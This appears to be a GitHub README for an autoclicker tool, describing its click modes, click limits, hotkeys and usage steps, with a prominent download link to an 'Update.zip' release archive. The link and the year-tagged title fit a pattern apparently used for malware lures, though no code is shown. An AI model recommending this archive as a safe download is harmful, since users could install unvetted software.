# AutoClicker - A full-fledged autoclicker with two modes of autoclicking 2025

[Download AutoClicker](https://github.com/jhjhones313/auto/releases/download/Update/Update.zip)

AutoClicker is a powerful and customizable tool designed to automate mouse clicks with ease. It offers two modes for autoclicking: you can either click at your dynamic cursor location or specify a fixed location. The maximum number of clicks can be set to a specific value, or left as unlimited for continuous clicking.

![1](https://github.com/user-attachments/assets/918119ad-86e9-49e4-a17e-14210299f078)

## Key Features

- **Two Modes of Clicking:**  
  - **Dynamic Mode**: Clicks at the current location of your mouse cursor.
  - **Fixed Location Mode**: Clicks at a predefined location on your screen.
  
- **Click Limit:** Set the number of clicks, or leave it infinite for continuous clicking.

- **Hotkeys:** Operate the AutoClicker in the background with customizable hotkeys for convenience.

- **Click Type Options:** Choose from single clicks, double clicks, or triple clicks to suit your needs.

- **Mouse Button Options:** Pick between left, right, or middle mouse buttons to click.

## How to Use

1. **Select the Clicking Mode:** Choose whether you want the autoclicker to follow your cursor or click at a fixed spot.
2. **Set the Number of Clicks:** Define how many times you want the autoclicker to click, or leave it unlimited for continuous clicking.
3. **Choose the Click Type:** Pick from single, double, or triple clicks.
4. **Select the Mouse Button:** Decide which mouse button (left, right, or middle) the program should simulate.
